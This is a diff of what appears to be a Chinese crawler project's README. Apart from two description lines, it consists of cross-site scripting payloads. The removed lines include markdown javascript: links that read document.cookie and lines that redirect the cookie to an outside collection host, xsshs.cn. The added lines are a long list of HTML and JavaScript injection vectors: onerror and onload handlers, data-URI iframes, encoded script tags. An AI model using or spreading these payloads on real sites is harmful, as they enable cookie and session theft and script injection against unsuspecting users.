@@ -3,46 +3,50 @@
 ### 没有使用框架,httpclient连接池+线程池+正则实现.
  
 ### 厚颜无耻的挂上博客[HacL](http://yhis.me)+求波星 :）
-[a](javascript:prompt(document.cookie))
-[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-![a](javascript:prompt(document.cookie))\
-<javascript:prompt(document.cookie)>
-<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
-![a'"`onerror=prompt(document.cookie)](x)\
-[citelol]: (javascript:prompt(document.cookie))
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[test](javascript://%0d%0aprompt(1))
-[test](javascript://%0d%0aprompt(1);com)
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[clickme](vbscript:alert(document.domain))
-_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
-<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
-[text](http://danlec.com " [@danlec](/danlec) ")
-[a](javascript:this;alert(1))
-[a](javascript:this;alert(1&#41;)
-[a](javascript&#58this;alert(1&#41;)
-[a](Javas&#99;ript:alert(1&#41;)
-[a](Javas%26%2399;ript:alert(1&#41;)
-[a](javascript:alert&#65534;(1&#41;)
-[a](javascript:confirm(1)
-[a](http://"a=1ipt://www.google.com%0A)
-[a](javascript://%0d%0aconfirm(1);com)
-[a](javascript:window.onerror=confirm;throw%201)
-[a](javascript:alert(document.domain&#41;)
-[a](javascript://www.google.com%0Aalert(1))
-[a]('javascript:alert("1")')
-[a](JaVaScRiPt:alert(1))
-![a](https://www.google.com/image.png"onload="alert(1))
-![a]("onerror="alert(1))
-</http://<?php\><\h1\><script:script>confirm(2)
-[XSS](.alert(1);)
-
-1.JPG');window.location.href='https://xsshs.cn/xss.php?do=api\u0026id=FKwT\u0026location=cookie';//;
-
-1.JPG');
-javascript:document.location='//xsshs.cn/xss.php?do=api\x26id=FKwT\x26cookie='%2bdocument.cookie
+<img src="test.jpg" alt ="``onload=xss()" />
+<pkav xmlns="><iframe onload=alert(1)">123</pkav>
+<p style="font-family:'ar\27 \3bx\3a expression\28xss\28\29\29\3bial';"></p>
+<img src=1 style="font-fam\22onerror\3d alert\28 1\29\20 ily:'aaa';">
+<listing><img src=1 onerror=alert(1) &</listing>
+<form action=javascript:alert('xss')>
+<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
+<svg onload=alert(1)>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+<iframe src="aaa" onmouseover=alert('xss') /><iframe>
+"><STYLE>@import"javascript:alert(2628)";</STYLE>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(2629)>
+>%22%27><img%20src%3d%22javascript:alert(2630)%22>
+'%uff1cscript%uff1ealert(2631)%uff1c/script%uff1e'
+<IMG SRC="javascript:alert(2633);">
+<IMG SRC=javascript:alert(2634)>
+<IMG SRC=JaVaScRiPt:alert(2635)>
+<IMG SRC=JaVaScRiPt:alert(2636)>
+<IMG SRC="jav&#x0A;ascript:alert(2640);">
+<IMG SRC="jav&#x0D;ascript:alert(2641);">
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(2643);<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<script>alert(2649)</script>
+%3cscript%3ealert(2650)%3c/script%3e
+%22%3e%3cscript%3ealert(2651)%3c/script%3e
+<IMG SRC="javascript:alert(2652);">
+<IMG SRC=javascript:alert(2653)>
+<IMG SRC=javascript:alert(2654)>
+<img src=xss onerror=alert(2655)>
+<IMG """><SCRIPT>alert(2656)</SCRIPT>">
+<IMG SRC=javascript:alert(2657))>
+<IMG SRC="jav ascript:alert(2658);">
+<IMG SRC="jav&#x09;ascript:alert(2659);">
+<BODY BACKGROUND="javascript:alert(2663)">
+<BODY ONLOAD=alert(2664)>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(2665);">
+<IMG SRC="javascript:alert(2666)"
+<<SCRIPT>alert(2668);//<</SCRIPT>
+%253cscript%253ealert(2669)%253c/script%253e
+"><s"%2b"cript>alert(2670)</script>
+foo<script>alert(2671)</script>
+<scr<script>ipt>alert(2672)</scr</script>ipt>
+';alert(2674))//\';alert(2674))//";alert(2674))//\";alert(2674))//--></SCRIPT>">'><SCRIPT>alert(2674))</SCRIPT>
+<marquee onstart='javascript:alert(2675);'>=(◕_◕)=
+</span></span><svg onload="alert(2676)//“ #"="">
+<q/oncut=alert(2677)>
+<title><img src="</title><script>alert(2678)</script>">
+<iframe><img src="</iframe><img src=x onerror=alert(2679)//">
